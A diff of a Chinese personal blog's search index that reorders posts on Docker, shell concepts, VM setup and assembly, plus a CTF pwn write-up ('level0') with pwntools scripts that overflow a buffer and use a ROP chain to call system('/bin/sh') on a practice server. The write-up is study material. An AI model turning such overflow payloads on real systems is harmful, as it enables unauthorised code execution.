@@ -43,6 +43,90 @@
     <content><![CDATA[]]></content>
   </entry>
   <entry>
+    <title></title>
+    <url>/2020/03/04/share/</url>
+    <content><![CDATA[<h2 id="什么是DOCKER"><a href="#什么是DOCKER" class="headerlink" title="什么是DOCKER"></a>什么是DOCKER</h2><p><a href="HTTPS://WWW.CNBLOGS.COM/ECJTUACM-873284962/P/9789130.HTML" target="_blank" rel="noopener">别人的吐血总结</a></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Docker 将应用程序与该程序的依赖，打包在一个文件里面。运行这个文件，就会生成一个虚拟容器。程序在这个虚拟容器里运行，就好像在真实的物理机上运行一样。有了 Docker ，就不用担心环境问题。</span><br></pre></td></tr></table></figure>
+
+<p>针对简单操作理解一下DOCKER</p>
+<p>拉取一个 DOCKER 镜像，我们可以用如下命令：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker pull image_name</span><br></pre></td></tr></table></figure>
+
+<p>image_name就是指的镜像</p>
+<p>pull就是拉取一个镜像</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Docker镜像	可以看作是一个特殊的文件系统，</span><br><span class="line">除了提供容器运行时所需的程序、库、资源、配置等文件外，还包含了一些为运行时准备的一些配置参数（如匿名卷、环境变量、用户等）。镜像不包含任何动态数据，其内容在构建之后也不会被改变。</span><br></pre></td></tr></table></figure>
+
+<h1 id="如何安装DOCKER"><a href="#如何安装DOCKER" class="headerlink" title="如何安装DOCKER?"></a>如何安装DOCKER?</h1><pre><code>docker rmi image_name        删除镜像
+
+docker run --name container-name -d image-name    运行容器
+--name：自定义容器名
+-d：表示后台运行
+
+docker ps（查看运行中的容器）；    加上-a；可以查看所有容器
+
+docker stop container-name/container-id    停止当前运行的指定容器
+
+启动    docker start container-name/container-id    启动容器
+
+删除    docker rm container-id    删除指定容器
+
+端口映射    -p 6379:6379
+如:docker run  --name myredis  -d -p 6379:6379 docker.io/redis    
+-p:主机端口映射到容器内部的端口
+
+
+ docker中run和start的区别
+docker run 后面指定的是一个镜像
+
+而docker start指定的是一个容器
+
+docker run是利用镜像生成容器，并启动容器，而docker start是启动一个之前生成过的容器 </code></pre><p>#实例运行、<br>    运行交互式的容器</p>
+<pre><code>sudo docker run -i -t  skysider/pwndocker /bin/bash
+-t: 在新容器内指定一个伪终端或终端。
+-i: 允许你对容器内的标准输入 (STDIN) 进行交互。</code></pre><p>停止容器<br>    docker stop </p>
+<p>exit 命令或者使用 CTRL+D 来退出容器。</p>
+<p>后台启动容器</p>
+<pre><code>sudo docker run -itd  skysider/pwndocker /bin/bash
+ -d 参数时，容器启动后会进入后台
+ -i: 允许你对容器内的标准输入 (STDIN) 进行交互。    
+ -t: 在新容器内指定一个伪终端或终端。</code></pre><p>docker ps 查看</p>
+<pre><code>在使用 -d 参数时，容器启动后会进入后台。此时想要进入容器，可以通过以下指令进入：
+
+docker attach
+
+docker exec：推荐大家使用 docker exec 命令，因为此退出容器终端，不会导致容器的停止。
+
+例如
+docker attach 4b6771050406
+docker exec -it b26d4f3e2cac /bin/bash
+
+删除容器使用 docker rm 命令：
+docker rm -f 1e560fca3906</code></pre><h2 id="docker-images-查看镜像"><a href="#docker-images-查看镜像" class="headerlink" title="docker images #查看镜像"></a>docker images #查看镜像</h2><pre><code>REPOSITORY：表示镜像的仓库源
+TAG：镜像的标签
+IMAGE ID：镜像ID
+CREATED：镜像创建时间
+SIZE：镜像大小</code></pre><p>我们可以从 Docker Hub 网站来搜索镜像</p>
+<p>面是一段简单的Dockerfile的例子：</p>
+<pre><code>FROM python:2.7
+MAINTAINER Angel_Kitty &lt;angelkitty6698@gmail.com&gt;
+COPY . /app
+WORKDIR /app
+RUN pip install -r requirements.txt
+EXPOSE 5000
+ENTRYPOINT [&quot;python&quot;]
+CMD [&quot;app.py&quot;]
+我们可以分析一下上面这个过程：
+
+1、从 Docker Hub 上 pull 下 python 2.7 的基础镜像
+2、显示维护者的信息
+3、copy 当前目录到容器中的 /app 目录下 复制本地主机的 &lt;src&gt; ( Dockerfile 所在目录的相对路径)到容器里 &lt;dest&gt;
+4、指定工作路径为 /app
+5、安装依赖包
+6、暴露 5000 端口
+7、启动 app
+这个例子是启动一个 python flask app 的 Dockerfile ( flask 是 python 的一个轻量的 web 框架)，相信大家从这个例子中能够稍微理解了Dockfile的组成以及指令的编写过程。</code></pre>]]></content>
+  </entry>
+  <entry>
     <title>drops做题收获</title>
     <url>/2019/08/08/p/</url>
     <content><![CDATA[<a id="more"></a>
@@ -165,6 +249,66 @@ print p.recvall()</code></pre><p> 这题中收获还是不小的，起码读懂�
       </tags>
   </entry>
   <entry>
+    <title>level0</title>
+    <url>/2019/08/08/level0/</url>
+    <content><![CDATA[<a id="more"></a>
+
+<p>1.首先要用到</p>
+<pre><code>&apos;file&apos;  ，来查看用多少位的ida打开。
+&apos;checksec&apos; ，用来查看文件的保护机制</code></pre><p><img alt data-src="/2019/08/08/level0/checksec.png" class="lazyload"></p>
+<pre><code>Stack 的作用是防止栈的溢出
+NX    的作用为防止栈中的可执行代码
+  其他的我还不太了解，以后再说</code></pre><p>2.ida基本操作</p>
+<pre><code>首先打开文件后可以按空格键，查看地址与汇编指令
+在功能表里找到main,便于分析程序
+按tab键会出现伪代码，我们分析这个来找出漏洞
+shift+F12可以出现字符串表
+ctrl+F 可以出现查找框
+想查找某个变量的地址，只需点击后按tab键</code></pre><p>3.本题所涉及的知识</p>
+<pre><code>首先查找漏洞在read函数，可以通过栈的溢出来覆盖函数的返回地址
+这里要了解一下栈的基本结构以及如何传递内容
+然后调用callsystem函数来获取shell</code></pre><p><img alt data-src="/2019/08/08/level0/z.png" class="lazyload"></p>
+<p>4.脚本的书写</p>
+<pre><code>1.from pwn import *
+    (导入pwn里的内容)
+2.p=remote(&apos;地址&apos;,端口)
+    （连接服务器并创建一个对象）、
+3.p.recv()  p.recvline() p.recvuntil()
+    (都是接受服务器返回的字符串，具体区别不太懂)
+4.p.send()  p.sendline() p.sendafter()
+    (都是向服务器传入字符串，具体区别不太懂)
+5.p.interactive()
+    (结尾加上，啥意思不懂)</code></pre><p>5.本题payload的构建</p>
+<pre><code>1.buf距离rbp 0x80，rbp本身占位8
+2.函数返回地址可填callsystem的地址
+3.payload=ox88*&apos;a&apos;+addr_callsystem</code></pre><p>6.产生的问题及解决</p>
+<pre><code>1.做完level1，你会想用system函数及“/bin/sh”字符串传参来做level0，但是本题并不能用
+    payload=0x88*&apos;a&apos;+p64(addr_system)+p64(0)+p64(addr_binsh)
+2.为什么呢？原来是因为64位的传参并不是由直接栈传入，而是储存在寄存器里，所以payload的构建也要改变。
+当参数少于7个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9
+当参数为7个以上时， 前 6 个与前面一样， 但后面的依次从 “右向左” 放入栈中，即和32位汇编一样。</code></pre><p><img alt data-src="/2019/08/08/level0/rop.png" class="lazyload"></p>
+<pre><code>3.所以构建的payload为
+    payload=0x88*&apos;a&apos;+p64(rdi)+p64(0x0400684)+p64(0x00400460)+p64(0)</code></pre><p>7.两种脚本：</p>
+<p>一</p>
+<p>`</p>
+<pre><code>#coding:utf-8
+from pwn import *
+p=remote(&apos;pwn2.jarvisoj.com&apos;,9881)
+s_addr=0x0000000000400596
+p.sendafter(&quot;World\n&quot;,0x88*&apos;a&apos;+p64(s_addr))
+p.interactive()</code></pre><p><code>二</code></p>
+<pre><code> #coding:utf-8
+from pwn import *
+p=remote(&apos;pwn2.jarvisoj.com&apos;,9881)
+rdi=0x400663
+p.sendafter(&quot;World\n&quot;,0x88*&apos;a&apos;+p64(rdi)+p64(0x0400684)+p64(0x00400460)+p64(0))
+p.interactive()</code></pre><p>`</p>
+]]></content>
+      <tags>
+        <tag>做题题解</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>python基本数据类型</title>
     <url>/2019/08/08/python/</url>
     <content><![CDATA[<a id="more"></a>
@@ -269,148 +413,27 @@ for key in info:
       </tags>
   </entry>
   <entry>
-    <title>level0</title>
-    <url>/2019/08/08/level0/</url>
-    <content><![CDATA[<a id="more"></a>
+    <title>shell</title>
+    <url>/2019/10/09/shell/</url>
+    <content><![CDATA[<p>#shell （计算机壳层）<br>在计算机科学中，Shell俗称壳（用来区别于核），是指“为使用者提供操作界面”的软件（命令解析器）。它类似于DOS下的command.com和后来的cmd.exe。它接收用户命令，然后调用相应的应用程序。</p>
+<p>同时它又是一种程序设计语言。作为命令语言，它交互式解释和执行用户输入的命令或者自动地解释和执行预先设定好的一连串的命令；作为程序设计语言，它定义了各种变量和参数，并提供了许多在高级语言中才具有的控制结构，包括循环和分支。<br>在排序算法中，Shell是希尔排序的名称。</p>
+<p>#基本上shell分两大类：</p>
+<p>###一：图形界面shell（Graphical User Interface shell 即 GUI shell）<br>例如：应用最为广泛的 Windows Explorer （微软的windows系列操作系统），还有也包括广为人知的 Linux shell，其中linux shell 包括 X window manager (BlackBox和FluxBox），以及功能更强大的CDE、GNOME、KDE、 XFCE。</p>
+<p>###二：命令行式shell（Command Line Interface shell ，即CLI shell）<br>例如：<br>bash / sh / ksh / csh（Unix/linux 系统）<br>（MS-DOS系统）<br>cmd.exe/ 命令提示字符（Windows NT 系统）<br>Windows PowerShell（支持 .NET Framework 技术的 Windows NT 系统）</p>
+<pre><code>传统意义上的shell指的是命令行式的shell，以后如果不特别注明，shell是指命令行式的shell。
 
-<p>1.首先要用到</p>
-<pre><code>&apos;file&apos;  ，来查看用多少位的ida打开。
-&apos;checksec&apos; ，用来查看文件的保护机制</code></pre><p><img alt data-src="/2019/08/08/level0/checksec.png" class="lazyload"></p>
-<pre><code>Stack 的作用是防止栈的溢出
-NX    的作用为防止栈中的可执行代码
-  其他的我还不太了解，以后再说</code></pre><p>2.ida基本操作</p>
-<pre><code>首先打开文件后可以按空格键，查看地址与汇编指令
-在功能表里找到main,便于分析程序
-按tab键会出现伪代码，我们分析这个来找出漏洞
-shift+F12可以出现字符串表
-ctrl+F 可以出现查找框
-想查找某个变量的地址，只需点击后按tab键</code></pre><p>3.本题所涉及的知识</p>
-<pre><code>首先查找漏洞在read函数，可以通过栈的溢出来覆盖函数的返回地址
-这里要了解一下栈的基本结构以及如何传递内容
-然后调用callsystem函数来获取shell</code></pre><p><img alt data-src="/2019/08/08/level0/z.png" class="lazyload"></p>
-<p>4.脚本的书写</p>
-<pre><code>1.from pwn import *
-    (导入pwn里的内容)
-2.p=remote(&apos;地址&apos;,端口)
-    （连接服务器并创建一个对象）、
-3.p.recv()  p.recvline() p.recvuntil()
-    (都是接受服务器返回的字符串，具体区别不太懂)
-4.p.send()  p.sendline() p.sendafter()
-    (都是向服务器传入字符串，具体区别不太懂)
-5.p.interactive()
-    (结尾加上，啥意思不懂)</code></pre><p>5.本题payload的构建</p>
-<pre><code>1.buf距离rbp 0x80，rbp本身占位8
-2.函数返回地址可填callsystem的地址
-3.payload=ox88*&apos;a&apos;+addr_callsystem</code></pre><p>6.产生的问题及解决</p>
-<pre><code>1.做完level1，你会想用system函数及“/bin/sh”字符串传参来做level0，但是本题并不能用
-    payload=0x88*&apos;a&apos;+p64(addr_system)+p64(0)+p64(addr_binsh)
-2.为什么呢？原来是因为64位的传参并不是由直接栈传入，而是储存在寄存器里，所以payload的构建也要改变。
-当参数少于7个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9
-当参数为7个以上时， 前 6 个与前面一样， 但后面的依次从 “右向左” 放入栈中，即和32位汇编一样。</code></pre><p><img alt data-src="/2019/08/08/level0/rop.png" class="lazyload"></p>
-<pre><code>3.所以构建的payload为
-    payload=0x88*&apos;a&apos;+p64(rdi)+p64(0x0400684)+p64(0x00400460)+p64(0)</code></pre><p>7.两种脚本：</p>
-<p>一</p>
-<p>`</p>
-<pre><code>#coding:utf-8
-from pwn import *
-p=remote(&apos;pwn2.jarvisoj.com&apos;,9881)
-s_addr=0x0000000000400596
-p.sendafter(&quot;World\n&quot;,0x88*&apos;a&apos;+p64(s_addr))
-p.interactive()</code></pre><p><code>二</code></p>
-<pre><code> #coding:utf-8
-from pwn import *
-p=remote(&apos;pwn2.jarvisoj.com&apos;,9881)
-rdi=0x400663
-p.sendafter(&quot;World\n&quot;,0x88*&apos;a&apos;+p64(rdi)+p64(0x0400684)+p64(0x00400460)+p64(0))
-p.interactive()</code></pre><p>`</p>
+文字操作系统与外部最主要的接口就叫做shell。
+shell是操作系统最外面的一层。
+shell管理你与操作系统之间的交互：
+等待你输入，向操作系统解释你的输入，
+并且处理各种各样的操作系统的输出结果。</code></pre><p>shell提供了你与操作系统之间通讯的方式。这种通讯可以以交互方式（从键盘输入，并且可以立即得到响应），或者以shell script(非交互）方式执行。shell script是放在文件中的一串shell和操作系统命令，它们可以被重复使用。本质上，shell script是命令行命令简单的组合到一个文件里面。</p>
+<p>Shell基本上是一个命令解释器，类似于DOS下的command。它接收用户命令（如ls等），然后调用相应的应用程序。较为通用的shell有标准的Bourne shell (sh）和C shell (csh）。</p>
+<p>###交互式shell和非交互式shell</p>
+<p>交互式模式就是shell等待你的输入，并且执行你提交的命令。这种模式被称作交互式是因为shell与用户进行交互。这种模式也是大多数用户非常熟悉的：登录、执行一些命令、签退。当你签退后，shell也终止了。<br>shell也可以运行在另外一种模式：非交互式模式。在这种模式下，shell不与你进行交互，而是读取存放在文件中的命令，并且执行它们。当它读到文件的结尾，shell也就终止了。</p>
 ]]></content>
       <tags>
-        <tag>做题题解</tag>
+        <tag>计算机基础概念</tag>
       </tags>
-  </entry>
-  <entry>
-    <title></title>
-    <url>/2020/03/04/share/</url>
-    <content><![CDATA[<h2 id="什么是DOCKER"><a href="#什么是DOCKER" class="headerlink" title="什么是DOCKER"></a>什么是DOCKER</h2><p><a href="HTTPS://WWW.CNBLOGS.COM/ECJTUACM-873284962/P/9789130.HTML" target="_blank" rel="noopener">别人的吐血总结</a></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Docker 将应用程序与该程序的依赖，打包在一个文件里面。运行这个文件，就会生成一个虚拟容器。程序在这个虚拟容器里运行，就好像在真实的物理机上运行一样。有了 Docker ，就不用担心环境问题。</span><br></pre></td></tr></table></figure>
-
-<p>针对简单操作理解一下DOCKER</p>
-<p>拉取一个 DOCKER 镜像，我们可以用如下命令：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker pull image_name</span><br></pre></td></tr></table></figure>
-
-<p>image_name就是指的镜像</p>
-<p>pull就是拉取一个镜像</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Docker镜像	可以看作是一个特殊的文件系统，</span><br><span class="line">除了提供容器运行时所需的程序、库、资源、配置等文件外，还包含了一些为运行时准备的一些配置参数（如匿名卷、环境变量、用户等）。镜像不包含任何动态数据，其内容在构建之后也不会被改变。</span><br></pre></td></tr></table></figure>
-
-<h1 id="如何安装DOCKER"><a href="#如何安装DOCKER" class="headerlink" title="如何安装DOCKER?"></a>如何安装DOCKER?</h1><pre><code>docker rmi image_name        删除镜像
-
-docker run --name container-name -d image-name    运行容器
---name：自定义容器名
--d：表示后台运行
-
-docker ps（查看运行中的容器）；    加上-a；可以查看所有容器
-
-docker stop container-name/container-id    停止当前运行的指定容器
-
-启动    docker start container-name/container-id    启动容器
-
-删除    docker rm container-id    删除指定容器
-
-端口映射    -p 6379:6379
-如:docker run  --name myredis  -d -p 6379:6379 docker.io/redis    
--p:主机端口映射到容器内部的端口
-
-
- docker中run和start的区别
-docker run 后面指定的是一个镜像
-
-而docker start指定的是一个容器
-
-docker run是利用镜像生成容器，并启动容器，而docker start是启动一个之前生成过的容器 </code></pre><p>#实例运行、<br>    运行交互式的容器</p>
-<pre><code>sudo docker run -i -t  skysider/pwndocker /bin/bash
--t: 在新容器内指定一个伪终端或终端。
--i: 允许你对容器内的标准输入 (STDIN) 进行交互。</code></pre><p>停止容器<br>    docker stop </p>
-<p>exit 命令或者使用 CTRL+D 来退出容器。</p>
-<p>后台启动容器</p>
-<pre><code>sudo docker run -itd  skysider/pwndocker /bin/bash
- -d 参数时，容器启动后会进入后台
- -i: 允许你对容器内的标准输入 (STDIN) 进行交互。    
- -t: 在新容器内指定一个伪终端或终端。</code></pre><p>docker ps 查看</p>
-<pre><code>在使用 -d 参数时，容器启动后会进入后台。此时想要进入容器，可以通过以下指令进入：
-
-docker attach
-
-docker exec：推荐大家使用 docker exec 命令，因为此退出容器终端，不会导致容器的停止。
-
-例如
-docker attach 4b6771050406
-docker exec -it b26d4f3e2cac /bin/bash
-
-删除容器使用 docker rm 命令：
-docker rm -f 1e560fca3906</code></pre><h2 id="docker-images-查看镜像"><a href="#docker-images-查看镜像" class="headerlink" title="docker images #查看镜像"></a>docker images #查看镜像</h2><pre><code>REPOSITORY：表示镜像的仓库源
-TAG：镜像的标签
-IMAGE ID：镜像ID
-CREATED：镜像创建时间
-SIZE：镜像大小</code></pre><p>我们可以从 Docker Hub 网站来搜索镜像</p>
-<p>面是一段简单的Dockerfile的例子：</p>
-<pre><code>FROM python:2.7
-MAINTAINER Angel_Kitty &lt;angelkitty6698@gmail.com&gt;
-COPY . /app
-WORKDIR /app
-RUN pip install -r requirements.txt
-EXPOSE 5000
-ENTRYPOINT [&quot;python&quot;]
-CMD [&quot;app.py&quot;]
-我们可以分析一下上面这个过程：
-
-1、从 Docker Hub 上 pull 下 python 2.7 的基础镜像
-2、显示维护者的信息
-3、copy 当前目录到容器中的 /app 目录下 复制本地主机的 &lt;src&gt; ( Dockerfile 所在目录的相对路径)到容器里 &lt;dest&gt;
-4、指定工作路径为 /app
-5、安装依赖包
-6、暴露 5000 端口
-7、启动 app
-这个例子是启动一个 python flask app 的 Dockerfile ( flask 是 python 的一个轻量的 web 框架)，相信大家从这个例子中能够稍微理解了Dockfile的组成以及指令的编写过程。</code></pre>]]></content>
   </entry>
   <entry>
     <title>stack2</title>
@@ -482,26 +505,14 @@ io.interactive()    </code></pre>]]></content>
       </tags>
   </entry>
   <entry>
-    <title>shell</title>
-    <url>/2019/10/09/shell/</url>
-    <content><![CDATA[<p>#shell （计算机壳层）<br>在计算机科学中，Shell俗称壳（用来区别于核），是指“为使用者提供操作界面”的软件（命令解析器）。它类似于DOS下的command.com和后来的cmd.exe。它接收用户命令，然后调用相应的应用程序。</p>
-<p>同时它又是一种程序设计语言。作为命令语言，它交互式解释和执行用户输入的命令或者自动地解释和执行预先设定好的一连串的命令；作为程序设计语言，它定义了各种变量和参数，并提供了许多在高级语言中才具有的控制结构，包括循环和分支。<br>在排序算法中，Shell是希尔排序的名称。</p>
-<p>#基本上shell分两大类：</p>
-<p>###一：图形界面shell（Graphical User Interface shell 即 GUI shell）<br>例如：应用最为广泛的 Windows Explorer （微软的windows系列操作系统），还有也包括广为人知的 Linux shell，其中linux shell 包括 X window manager (BlackBox和FluxBox），以及功能更强大的CDE、GNOME、KDE、 XFCE。</p>
-<p>###二：命令行式shell（Command Line Interface shell ，即CLI shell）<br>例如：<br>bash / sh / ksh / csh（Unix/linux 系统）<br>（MS-DOS系统）<br>cmd.exe/ 命令提示字符（Windows NT 系统）<br>Windows PowerShell（支持 .NET Framework 技术的 Windows NT 系统）</p>
-<pre><code>传统意义上的shell指的是命令行式的shell，以后如果不特别注明，shell是指命令行式的shell。
-
-文字操作系统与外部最主要的接口就叫做shell。
-shell是操作系统最外面的一层。
-shell管理你与操作系统之间的交互：
-等待你输入，向操作系统解释你的输入，
-并且处理各种各样的操作系统的输出结果。</code></pre><p>shell提供了你与操作系统之间通讯的方式。这种通讯可以以交互方式（从键盘输入，并且可以立即得到响应），或者以shell script(非交互）方式执行。shell script是放在文件中的一串shell和操作系统命令，它们可以被重复使用。本质上，shell script是命令行命令简单的组合到一个文件里面。</p>
-<p>Shell基本上是一个命令解释器，类似于DOS下的command。它接收用户命令（如ls等），然后调用相应的应用程序。较为通用的shell有标准的Bourne shell (sh）和C shell (csh）。</p>
-<p>###交互式shell和非交互式shell</p>
-<p>交互式模式就是shell等待你的输入，并且执行你提交的命令。这种模式被称作交互式是因为shell与用户进行交互。这种模式也是大多数用户非常熟悉的：登录、执行一些命令、签退。当你签退后，shell也终止了。<br>shell也可以运行在另外一种模式：非交互式模式。在这种模式下，shell不与你进行交互，而是读取存放在文件中的命令，并且执行它们。当它读到文件的结尾，shell也就终止了。</p>
-]]></content>
+    <title>test</title>
+    <url>/2020/04/04/test/</url>
+    <content><![CDATA[]]></content>
+      <categories>
+        <category>分类</category>
+      </categories>
       <tags>
-        <tag>计算机基础概念</tag>
+        <tag>测试</tag>
       </tags>
   </entry>
   <entry>
@@ -524,17 +535,6 @@ esp  </code></pre><p>待更新。。</p>
 ]]></content>
       <tags>
         <tag>有关栈</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>test</title>
-    <url>/2020/04/04/test/</url>
-    <content><![CDATA[]]></content>
-      <categories>
-        <category>分类</category>
-      </categories>
-      <tags>
-        <tag>测试</tag>
       </tags>
   </entry>
   <entry>
@@ -574,35 +574,6 @@ sudo gedit pip.conf
 网址：    https://blog.csdn.net/yuzaipiaofei/article/details/80891108
         https://www.jianshu.com/p/364146ade9be</code></pre><p>5.安装pwntools</p>
 <pre><code>https://www.cnblogs.com/cai00/p/10696728.html</code></pre><p>6.安装pwndbg<br>    <a href="https://blog.csdn.net/kevin66654/article/details/86773517" target="_blank" rel="noopener">https://blog.csdn.net/kevin66654/article/details/86773517</a></p>
-]]></content>
-      <tags>
-        <tag>虚拟机配置</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>虚拟机配置</title>
-    <url>/2019/11/15/%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%85%8D%E7%BD%AE/</url>
-    <content><![CDATA[<p>#今天讲的是pwndbg的一些基本操作</p>
-<p><strong>1.首先下载Ubuntu</strong><br><a href="https://blog.csdn.net/kwame211/article/details/83902851" target="_blank" rel="noopener">https://blog.csdn.net/kwame211/article/details/83902851</a></p>
-<p><strong>2.安装VMtools</strong></p>
-<p><a href="https://blog.csdn.net/zxf1242652895/article/details/78203473" target="_blank" rel="noopener">https://blog.csdn.net/zxf1242652895/article/details/78203473</a></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">安装时会出现很多提示 输入yes/no  都选 yes，</span><br><span class="line"></span><br><span class="line">如果提示 的是 路径， 则直接回车就好。</span><br></pre></td></tr></table></figure>
-
-<p><strong>3.更换软件源</strong></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">源就是软件源的意思，包管理器从软件源下载软件包，并从软件源下载软件更新，</span><br><span class="line">相当于软件的下载服务器和更新服务器，</span><br><span class="line">只不过不是某款软件的，而是该系统所有软件的下载服务器</span><br></pre></td></tr></table></figure>
-
-<p><a href="https://blog.csdn.net/meteor_s/article/details/81301252" target="_blank" rel="noopener">https://blog.csdn.net/meteor_s/article/details/81301252</a></p>
-<p><strong>4.安装pip</strong></p>
-<p>pip 是“A tool for installing and managing Python packages.”，<br>也就是说pip是python的软件安装工具</p>
-<p>安装直接在终端输入：  sudo apt install python-pip</p>
-<p><strong>5.更改pip源</strong><br>我们在进行Python开发时，经常会通过pip操作来安装一些packages，<br>但是由于网络速度非常慢，安装耗时长，所以我们需要把pip的源设置成国内的</p>
-<p>创建一个配置文件</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo mkdir ~/.pip/</span><br><span class="line">cd ./.pip/</span><br><span class="line">touch pip.conf</span><br><span class="line">sudo gedit pip.conf</span><br></pre></td></tr></table></figure>
-
-<p>按照链接更改配置文件<br><a href="https://blog.csdn.net/yuzaipiaofei/article/details/80891108" target="_blank" rel="noopener">https://blog.csdn.net/yuzaipiaofei/article/details/80891108</a></p>
-<p><strong>6.安装pwntools</strong></p>
-<p><a href="https://www.cnblogs.com/cai00/p/10696728.html" target="_blank" rel="noopener">https://www.cnblogs.com/cai00/p/10696728.html</a></p>
-<p><strong>7.安装pwndbg</strong><br><a href="https://blog.csdn.net/kevin66654/article/details/86773517" target="_blank" rel="noopener">https://blog.csdn.net/kevin66654/article/details/86773517</a></p>
 ]]></content>
       <tags>
         <tag>虚拟机配置</tag>
@@ -656,6 +627,35 @@ sudo gedit pip.conf
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line">指令cmp ax,bx 的逻辑含义是比较ax和bx的值，如果执行后：</span><br><span class="line"><span class="number">1.</span>  zf=<span class="number">1</span> ===&gt; (ax)=(bx)</span><br><span class="line"><span class="number">2.</span>  zf=<span class="number">0</span> ===&gt; (ax)!=(bx)</span><br><span class="line"><span class="number">3.</span>  cf=<span class="number">1</span> ===&gt; (ax)&lt;(bx)</span><br><span class="line"><span class="number">4.</span>  cf=<span class="number">0</span> ===&gt; (ax)&gt;=(bx)</span><br><span class="line"><span class="number">5.</span>  cf=zf=<span class="number">0</span> ===&gt; (ax)&gt;(bx)</span><br><span class="line"><span class="number">6.</span>  cf=<span class="number">1</span>或zf=<span class="number">1</span> ===&gt; (ax)&lt;=(bx)</span><br><span class="line">cmp指令的比较结果需要通过条件转移指令来检测。</span><br><span class="line">|指令 |解释 |含义 |检测的相关标志位|</span><br><span class="line">|-------|-------|-------|----------------|</span><br><span class="line">|je|e:equal|等于则转移|zf=<span class="number">1</span>|</span><br><span class="line">|jne|ne:<span class="keyword">not</span> equal|不等于则转移|zf=<span class="number">0</span>|</span><br><span class="line">|jb|b:below|低于则转移|cf=<span class="number">1</span>|</span><br><span class="line">|jnb|nb:<span class="keyword">not</span> below| 不低于则转移| cf=<span class="number">0</span>|</span><br><span class="line">|ja |a:above| 高于则转移| cf=<span class="number">0</span>且zf=<span class="number">0</span>|</span><br><span class="line">|jna| na:<span class="keyword">not</span> above| 不高于则转移| cf=<span class="number">1</span>或zf=<span class="number">1</span>|</span><br></pre></td></tr></table></figure>]]></content>
       <tags>
         <tag>pwn学习</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>虚拟机配置</title>
+    <url>/2019/11/15/%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%85%8D%E7%BD%AE/</url>
+    <content><![CDATA[<p>#今天讲的是pwndbg的一些基本操作</p>
+<p><strong>1.首先下载Ubuntu</strong><br><a href="https://blog.csdn.net/kwame211/article/details/83902851" target="_blank" rel="noopener">https://blog.csdn.net/kwame211/article/details/83902851</a></p>
+<p><strong>2.安装VMtools</strong></p>
+<p><a href="https://blog.csdn.net/zxf1242652895/article/details/78203473" target="_blank" rel="noopener">https://blog.csdn.net/zxf1242652895/article/details/78203473</a></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">安装时会出现很多提示 输入yes/no  都选 yes，</span><br><span class="line"></span><br><span class="line">如果提示 的是 路径， 则直接回车就好。</span><br></pre></td></tr></table></figure>
+
+<p><strong>3.更换软件源</strong></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">源就是软件源的意思，包管理器从软件源下载软件包，并从软件源下载软件更新，</span><br><span class="line">相当于软件的下载服务器和更新服务器，</span><br><span class="line">只不过不是某款软件的，而是该系统所有软件的下载服务器</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://blog.csdn.net/meteor_s/article/details/81301252" target="_blank" rel="noopener">https://blog.csdn.net/meteor_s/article/details/81301252</a></p>
+<p><strong>4.安装pip</strong></p>
+<p>pip 是“A tool for installing and managing Python packages.”，<br>也就是说pip是python的软件安装工具</p>
+<p>安装直接在终端输入：  sudo apt install python-pip</p>
+<p><strong>5.更改pip源</strong><br>我们在进行Python开发时，经常会通过pip操作来安装一些packages，<br>但是由于网络速度非常慢，安装耗时长，所以我们需要把pip的源设置成国内的</p>
+<p>创建一个配置文件</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo mkdir ~/.pip/</span><br><span class="line">cd ./.pip/</span><br><span class="line">touch pip.conf</span><br><span class="line">sudo gedit pip.conf</span><br></pre></td></tr></table></figure>
+
+<p>按照链接更改配置文件<br><a href="https://blog.csdn.net/yuzaipiaofei/article/details/80891108" target="_blank" rel="noopener">https://blog.csdn.net/yuzaipiaofei/article/details/80891108</a></p>
+<p><strong>6.安装pwntools</strong></p>
+<p><a href="https://www.cnblogs.com/cai00/p/10696728.html" target="_blank" rel="noopener">https://www.cnblogs.com/cai00/p/10696728.html</a></p>
+<p><strong>7.安装pwndbg</strong><br><a href="https://blog.csdn.net/kevin66654/article/details/86773517" target="_blank" rel="noopener">https://blog.csdn.net/kevin66654/article/details/86773517</a></p>
+]]></content>
+      <tags>
+        <tag>虚拟机配置</tag>
       </tags>
   </entry>
   <entry>
